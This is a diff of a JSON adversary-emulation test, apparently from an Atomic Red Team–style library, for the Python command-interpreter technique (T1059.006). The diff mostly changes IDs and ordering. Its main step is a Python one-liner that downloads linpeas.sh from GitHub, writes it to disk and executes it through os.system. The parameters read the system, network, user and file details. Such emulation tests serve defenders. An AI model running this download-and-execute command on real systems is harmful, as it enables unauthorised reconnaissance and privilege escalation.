@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "a6755483-e602-457f-ac48-9e295930e08d",
+      "id": "f5b137e2-2420-4577-ab14-73d57b82c401",
       "type": "execute-command",
       "data": {
         "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "6ab35e86-39f0-4547-a67a-42d4890ed2bc",
+      "id": "3e4fe51b-13c3-4ce4-96f6-e82496950bf6",
       "type": "execute-command",
       "data": {
         "command": "rm #{payload_file_name} \n",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "1a344b77-c2e1-4977-8f97-99c54c270894",
+      "id": "c859e0a6-76fa-4e57-bfd3-e400238c42c0",
       "name": "Check dependency 1/1",
       "description": "Verify if python is in the environment variable path and attempt to import requests library.",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "c796caf4-3da4-488c-9f71-627a5ed5707a",
+      "id": "a04d069a-b2c5-405d-a328-44b8f2f35239",
       "name": "Resolve dependency 1/1",
       "description": "Verify if python is in the environment variable path and attempt to import requests library.",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "e36a97ff-32a8-4540-876c-61f44291baa8",
+      "id": "ecdf4b94-7529-4f2e-850b-f98761389418",
       "name": "Re-check dependency 1/1",
       "description": "Verify if python is in the environment variable path and attempt to import requests library.",
       "type": "execute-command",
@@ -60,53 +60,41 @@
   ],
   "flows": [
     {
-      "s": "a6755483-e602-457f-ac48-9e295930e08d",
+      "s": "f5b137e2-2420-4577-ab14-73d57b82c401",
       "p": "on-success",
-      "o": "6ab35e86-39f0-4547-a67a-42d4890ed2bc"
+      "o": "3e4fe51b-13c3-4ce4-96f6-e82496950bf6"
     },
     {
-      "s": "a6755483-e602-457f-ac48-9e295930e08d",
+      "s": "f5b137e2-2420-4577-ab14-73d57b82c401",
       "p": "on-failure",
-      "o": "6ab35e86-39f0-4547-a67a-42d4890ed2bc"
+      "o": "3e4fe51b-13c3-4ce4-96f6-e82496950bf6"
     },
     {
-      "s": "1a344b77-c2e1-4977-8f97-99c54c270894",
+      "s": "c859e0a6-76fa-4e57-bfd3-e400238c42c0",
       "p": "on-success",
-      "o": "a6755483-e602-457f-ac48-9e295930e08d"
+      "o": "f5b137e2-2420-4577-ab14-73d57b82c401"
     },
     {
-      "s": "1a344b77-c2e1-4977-8f97-99c54c270894",
+      "s": "c859e0a6-76fa-4e57-bfd3-e400238c42c0",
       "p": "on-failure",
-      "o": "c796caf4-3da4-488c-9f71-627a5ed5707a"
+      "o": "a04d069a-b2c5-405d-a328-44b8f2f35239"
     },
     {
-      "s": "c796caf4-3da4-488c-9f71-627a5ed5707a",
+      "s": "a04d069a-b2c5-405d-a328-44b8f2f35239",
       "p": "on-success",
-      "o": "e36a97ff-32a8-4540-876c-61f44291baa8"
+      "o": "ecdf4b94-7529-4f2e-850b-f98761389418"
     },
     {
-      "s": "e36a97ff-32a8-4540-876c-61f44291baa8",
+      "s": "ecdf4b94-7529-4f2e-850b-f98761389418",
       "p": "on-failure",
-      "o": "a6755483-e602-457f-ac48-9e295930e08d"
+      "o": "f5b137e2-2420-4577-ab14-73d57b82c401"
     }
   ],
   "tags": [
-    "T1059.006",
-    "atomic-red-team"
+    "T1059",
+    "T1059.006"
   ],
   "input_arguments": [
-    {
-      "name": "script_url",
-      "type": "string",
-      "description": "Shell script public URL",
-      "value": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
-    },
-    {
-      "name": "payload_file_name",
-      "type": "string",
-      "description": "Name of shell script downloaded from the script_url",
-      "value": "T1059.006-payload"
-    },
     {
       "name": "executor",
       "type": "string",
@@ -118,6 +106,18 @@
       "type": "string",
       "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.",
       "value": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
+    },
+    {
+      "name": "script_url",
+      "type": "string",
+      "description": "Shell script public URL",
+      "value": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
+    },
+    {
+      "name": "payload_file_name",
+      "type": "string",
+      "description": "Name of shell script downloaded from the script_url",
+      "value": "T1059.006-payload"
     }
   ]
 }
